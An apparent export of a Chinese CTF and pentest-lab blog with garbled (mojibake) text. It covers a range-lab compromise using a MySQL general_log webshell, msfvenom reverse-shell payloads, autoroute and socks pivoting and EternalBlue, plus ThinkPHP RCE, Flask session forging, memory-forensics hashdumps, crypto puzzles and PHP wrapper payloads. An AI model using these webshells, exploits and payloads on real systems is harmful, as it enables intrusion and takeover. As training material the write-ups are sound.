<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709222532.png"></p>
<p>æ—¥å¿—ä¸ºå…³é—­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL general_log = ON;# å¼€å¯æ—¥å¿—</span><br><span class="line">SET GLOBAL general_log_file = &#x27;C:/WWW/test.php&#x27;;# è®¾ç½®æ—¥å¿—ä½ç½®ä¸ºç½‘ç«™ç›®å½•</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709225410.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval ($_POST[1]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥</p>
<p>æ¼æ´2 ç»å…¸æ°¸æ’ä¹‹è“ï¼Œçœ‹kaliå·¥å…·é‚£ä¸€ç¯‡ã€‚</p>
<p>æ¼æ´3 yxcms æ¡†æ¶æ¼æ´ï¼Œä½†é¶æœºphpstudy å¥½åƒæœ‰é—®é¢˜ï¼Œå‘ç°phpsudy å¥½åƒç›®å½•ä¸å¯¹ï¼Œä¹Ÿè°ƒä¸åŠ¨ï¼Œç®—äº†ï¼Œæ— æ‰€è°“äº†ï¼Œç®€å•çš„xssã€‚</p>
<p>ä¸Šä¼ </p>
<p>msfmenueæœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.158.129 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001  #åˆ‡æ¢ç¼–ç </span><br></pre></td></tr></table></figure>

<h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>æŸ¥çœ‹ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.143</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</span><br><span class="line">run get_local_subnets</span><br><span class="line">#æ·»åŠ ä¸€æ¡è·¯ç”±</span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -p æŸ¥çœ‹é…ç½®ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨msfçš„socksä»£ç†æ¨¡å—ï¼Œ</p>
<h3 id="proxychains4-msf"><a href="#proxychains4-msf" class="headerlink" title="proxychains4+msf"></a>proxychains4+msf</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">jobs //æŸ¥çœ‹å·¥ä½œçŠ¶æ€</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf  </span><br></pre></td></tr></table></figure>

<p>å†…ç½‘ä¿¡æ¯æ”¶é›†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141 -p22,445,443,135 </span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230713133324.png"></p>
<p>å‘ç°445ç«¯å£å¼€æ”¾å°è¯•ï¼Œms17-010æ²¡æ•ˆæœ</p>
<p>æ‰“windows 2008</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lport 5555</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/adsry/p/15039414.html">https://www.cnblogs.com/adsry/p/15039414.html</a></p>
]]></content>
      <tags>
        <tag>çº¢æ—¥é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp</title>
    <url>/2023/07/14/thinkphp/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</span><br></pre></td></tr></table></figure>

<p>ç”±<code>&#39;URL_CASE_INSENSITIVE&#39; =&gt; true,</code>è¿™ä¸ªé…ç½®å†³å®šã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/admin/login/ctfshowlogin</span><br></pre></td></tr></table></figure>

<h2 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h2><p>æ¼æ´å‡½æ•°åœ¨Common&#x2F;Conf&#x2F;config.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    &#x27;ctfshow/:f/:a&#x27; =&gt;function($f,$a)&#123;</span><br><span class="line">       call_user_func($f, $a);</span><br><span class="line">       &#125;</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php/ctfshow/assert/eval($_POST[1])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h2><h2 id="web575"><a href="#web575" class="headerlink" title="web575"></a>web575</h2>]]></content>
  </entry>
  <entry>
    <title>nss2</title>
    <url>/2023/05/23/nss2/</url>
    <content><![CDATA[<h2 id="LitCTF-2023-Flagç‚¹å‡»å°±é€ï¼"><a href="#LitCTF-2023-Flagç‚¹å‡»å°±é€ï¼" class="headerlink" title="[LitCTF 2023]Flagç‚¹å‡»å°±é€ï¼"></a>[LitCTF 2023]Flagç‚¹å‡»å°±é€ï¼</h2><p><strong>flask session ä¼ªé€ </strong></p>
<p>decode.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"> </span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"> </span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"> </span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"> </span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"> </span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python decode.py å¯†æ–‡</span><br></pre></td></tr></table></figure>

<p>encode.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br><span class="line">__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><span class="line"> </span><br><span class="line"># standard imports</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"> </span><br><span class="line"># Abstract Base Classes (PEP 3119)</span><br><span class="line">if sys.version_info[0] &lt; 3: # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line">elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"> </span><br><span class="line"># Lib for argument parsing</span><br><span class="line">import argparse</span><br><span class="line"> </span><br><span class="line"># external Imports</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"> </span><br><span class="line">class MockApp(object):</span><br><span class="line"> </span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"> </span><br><span class="line">if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # Args are only relevant for __main__ usage</span><br><span class="line">    </span><br><span class="line">    ## Description for help</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,</span><br><span class="line">                epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)</span><br><span class="line"> </span><br><span class="line">    ## prepare sub commands</span><br><span class="line">    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the encode command</span><br><span class="line">    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)</span><br><span class="line">    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=True)</span><br><span class="line">    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie structure&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the decode command</span><br><span class="line">    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)</span><br><span class="line">    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=False)</span><br><span class="line">    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie value&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## get args</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">    ## find the option chosen</span><br><span class="line">    if(args.subcommand == &#x27;encode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    elif(args.subcommand == &#x27;decode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        elif(args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure>

<p>å¯†ç æ˜¯çŒœå‡ºçš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python encode.py encode -s &#x27;LitCTF&#x27; -t &#x27;&#123; &quot;name&quot;: &quot;admin&quot; &#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="è“å¸½æ¯-2022-åˆèµ›-è®¡ç®—æœºå–è¯-1"><a href="#è“å¸½æ¯-2022-åˆèµ›-è®¡ç®—æœºå–è¯-1" class="headerlink" title="[è“å¸½æ¯ 2022 åˆèµ›]è®¡ç®—æœºå–è¯_1"></a>[è“å¸½æ¯ 2022 åˆèµ›]è®¡ç®—æœºå–è¯_1</h2><p>ä¸‹è½½å®‰è£…ï¼Œçœ‹kaliå·¥å…·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python vol.py -f  /home/zhou/æ¡Œé¢/1.dmp windows.hashdump</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/23/nss2/QQ%E6%88%AA%E5%9B%BE20230702134524.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7f21caca5685f10d9e849cc84c340528</span><br></pre></td></tr></table></figure>

<p>ç„¶åè§£å¯†ï¼Œå’‹è§£ï¼Œè¿˜æ²¡æƒ³å¥½</p>
<p>ç°å¯¹ä¸€ä¸ªwindowsè®¡ç®—æœºè¿›è¡Œå–è¯ï¼Œè¯·æ‚¨å¯¹ä»¥ä¸‹é—®é¢˜è¿›è¡Œåˆ†æè§£ç­”ã€‚<br>åˆ¶ä½œè¯¥å†…å­˜é•œåƒçš„è¿›ç¨‹Pidå·æ˜¯å¤šå°‘</p>
<p>python vol.py -f  &#x2F;home&#x2F;zhou&#x2F;æ¡Œé¢&#x2F;2.dmp windows.pslist</p>
<p><img src="/2023/05/23/nss2/QQ%E6%88%AA%E5%9B%BE20230702140146.png"></p>
<h2 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezrce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezrce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce</h2>]]></content>
      <tags>
        <tag>nss</tag>
      </tags>
  </entry>
  <entry>
    <title>crypto</title>
    <url>/2023/01/08/crypto/</url>
    <content><![CDATA[<p>â€‹     tpye7åŠ å¯†</p>
<p>â€‹    uuencode</p>
<p>â€‹       <span id="more"></span></p>
<h1 id="tpye7è§£å¯†"><a href="#tpye7è§£å¯†" class="headerlink" title="tpye7è§£å¯†"></a>tpye7è§£å¯†</h1><p>ctfshow èœç‹—æ¯ ç±»å‹-7<br>094F5A0F0A0D1805103B0B3D143117183B720438350A45550967674D1E064F2969784440455A460F1A1B<br>tpye7 åŠ å¯†ç»“æœä¸º16è¿›åˆ¶<br><a href="https://www.bejson.com/encrypt/type7_decode/">tpye7è§£å¯†</a><br>ctfshow{Wow_u_Kn0w_Ci$c0_Type7_P@ssword!}</p>
<h1 id="Uuencode"><a href="#Uuencode" class="headerlink" title="Uuencode"></a>Uuencode</h1><p>buu crypto Unencode<br>å¯†æ–‡ï¼š<br>89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]<br><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">uuencodeè§£å¯†ç½‘ç«™</a><br>flag{dsdasdsa99877LLLKK}</p>
<h1 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h1><p>buu Windowsç³»ç»Ÿå¯†ç </p>
<p>a7fcb22a88038f35a8f39d503e7f0062</p>
<p><a href="https://www.cmd5.com/">md5åœ¨çº¿è§£å¯†ç ´è§£,md5è§£å¯†åŠ å¯† (cmd5.com)</a></p>
<p>è§£å¯† good-luck</p>
<h1 id="ä¸­æ–‡ç”µç "><a href="#ä¸­æ–‡ç”µç " class="headerlink" title="ä¸­æ–‡ç”µç "></a>ä¸­æ–‡ç”µç </h1><p>buu ä¿¡æ¯åŒ–æ—¶ä»£çš„æ­¥ä¼</p>
<p>606046152623600817831216121621196386</p>
<p><a href="http://code.mcdvisa.com/">ä¸­æ–‡ç”µç æŸ¥è¯¢ Chinese Commercial Code - æ ‡å‡†ç”µæŠ¥ç å…è´¹åœ¨çº¿æŸ¥è¯¢|å§“åç”µç |ç¾å›½ç­¾è¯ç”µç  (mcdvisa.com)</a></p>
<p>è§£å¯†ï¼šè®¡ç®—æœºè¦ä»å¨ƒå¨ƒæŠ“èµ·</p>
<h1 id="å˜å¼‚å‡¯æ’’"><a href="#å˜å¼‚å‡¯æ’’" class="headerlink" title="å˜å¼‚å‡¯æ’’"></a>å˜å¼‚å‡¯æ’’</h1><p>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</p>
<p><a href="https://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p>
<p>è§£ç ï¼šflag substitution cipher decryption is always easy just like a piece of cake</p>
<p>å»ç©ºæ ¼</p>
<h1 id="playfairè§£å¯†"><a href="#playfairè§£å¯†" class="headerlink" title="playfairè§£å¯†"></a>playfairè§£å¯†</h1><p>è¿˜èƒ½æç¤ºä»€ä¹ˆå‘¢ï¼Ÿå…¬å¹³çš„ç©å§ï¼ˆå¯†é’¥è‡ªå·±æ‰¾ï¼‰ Dncnoqqfliqrpgeklwmppu æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤, flag{å°å†™å­—æ¯}</p>
<p>æç¤ºå…¬å¹³çš„ç©ï¼Œplayfair</p>
<p><a href="https://rumkin.com/tools/cipher/playfair/">Playfair (rumkin.com)</a></p>
<p>å¯†é’¥playfair</p>
<p>flag{itisnotaproblemhavefun}</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title>phpä¼ªåè®®</title>
    <url>/2023/01/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><code>php://input</code></p>
<p><code>data://text/plain</code>,xxxx</p>
<p><code>php://filter</code></p>
  <span id="more"></span>

<p>PHPå¸¸è§çš„ä¼ªåè®®å¦‚ä¸‹ï¼š</p>
<p>æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>æ–‡ä»¶è¯»å–å‡½æ•°ï¼š</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
<table>
<thead>
<tr>
<th>file:&#x2F;&#x2F; è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</th>
</tr>
</thead>
<tbody><tr>
<td>http:&#x2F;&#x2F; è®¿é—®HTTP(s)ç½‘å€</td>
</tr>
<tr>
<td>ftp:&#x2F;&#x2F; è®¿é—®FTP(s)URLs</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F; è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ(I&#x2F;O streams)</td>
</tr>
<tr>
<td>zlib:&#x2F;&#x2F; å‹ç¼©æµ</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F; æ•°æ®(RFC 2397)</td>
</tr>
<tr>
<td>glob:&#x2F;&#x2F; æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F; PHPå½’æ¡£</td>
</tr>
<tr>
<td>ssh2:&#x2F;&#x2F; Secure Shell 2</td>
</tr>
<tr>
<td>rar:&#x2F;&#x2F; RAR</td>
</tr>
<tr>
<td>ogg:&#x2F;&#x2F; éŸ³é¢‘æµ</td>
</tr>
<tr>
<td>expect:&#x2F;&#x2F; å¤„ç†äº¤äº’å¼çš„æµ</td>
</tr>
</tbody></table>
<p>åœ¨è¿™é‡Œè¯¦ç»†è¯´ä¸€ä¸‹è¿™ä¸ª<code>php://filter</code></p>
<p>,è¿™ä¸ªæ˜¯å¸¸ç”¨çš„ä¼ªåè®®ï¼Œä¸€èˆ¬ç”¨äºä»»æ„æ–‡ä»¶è¯»å–ï¼Œæœ‰çš„æ—¶å€™ä¹Ÿå¯ä»¥ç”¨åœ¨getshellï¼Œåœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p>åœ¨è¿™é‡Œä¸¾ä¸ªä¾‹å­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>å…³äºä¸Šé¢è¿™ä¸ªï¼Œè§£é‡Šä¸€ä¸‹ï¼Œé¦–å…ˆfileå…³é”®å­—çš„getå‚æ•°ä¼ é€’ï¼Œphp:&#x2F;&#x2F;æ˜¯ä¸€ç§åè®®åç§°ï¼Œphp:&#x2F;&#x2F;filter&#x2F;æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ&#x2F;read&#x3D;convert.base64-encode&#x2F;è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯base64ç¼–ç åï¼Œresourse&#x3D;index.phpè¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚</p>
<p>ä¸Šé¢ä¸¾çš„å¸¸ç”¨çš„ä¼ªåè®®çš„ç”¨æ³•ï¼š</p>
<p>1.phpä¼ªåè®®<br>ç”¨æ³•ï¼š<br><code>php://input</code>,ç”¨äºæ‰§è¡Œphpä»£ç ï¼Œéœ€è¦postè¯·æ±‚æäº¤æ•°æ®ã€‚</p>
<p><strong>php:&#x2F;&#x2F;input</strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>éœ€è¦å¼€å¯allow_url_fopen:php:&#x2F;&#x2F;inputã€php:&#x2F;&#x2F;stdinã€php:&#x2F;&#x2F;memoryã€php:&#x2F;&#x2F;temp<br>ä¸éœ€è¦å¼€å¯allow_url_fopen:php:&#x2F;&#x2F;filter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATAéƒ¨åˆ†]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>2.ã€dataåè®®</p>
<p>ç”¨æ³•ï¼š<br><code>data://text/plain</code>,xxxx(è¦æ‰§è¡Œçš„phpä»£ç )<br><code>data://text/plain;base64</code>,xxxx(base64ç¼–ç åçš„æ•°æ®)<br>ä¾‹ï¼š<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCJwd2QiKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>3.ã€fileåè®®<br>ç”¨æ³•ï¼š<br><code>file://</code>[æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„ç»å¯¹è·¯å¾„]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=file:///etc/passsword</span><br></pre></td></tr></table></figure>

<p>ä¸‰ä¸ª&#x2F; ç¬¬ä¸‰ä¸ªæ æ˜¯æ ¹ç›®å½•ä¸Šçš„æ </p>
<p><a href="https://segmentfault.com/a/1190000018991087">PHPä¼ªåè®®æ€»ç»“ - ä¸ªäººæ–‡ç«  - SegmentFault æ€å¦</a></p>
<p>ctfshow</p>
<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?=`tac f*`;?&gt;</span><br></pre></td></tr></table></figure>

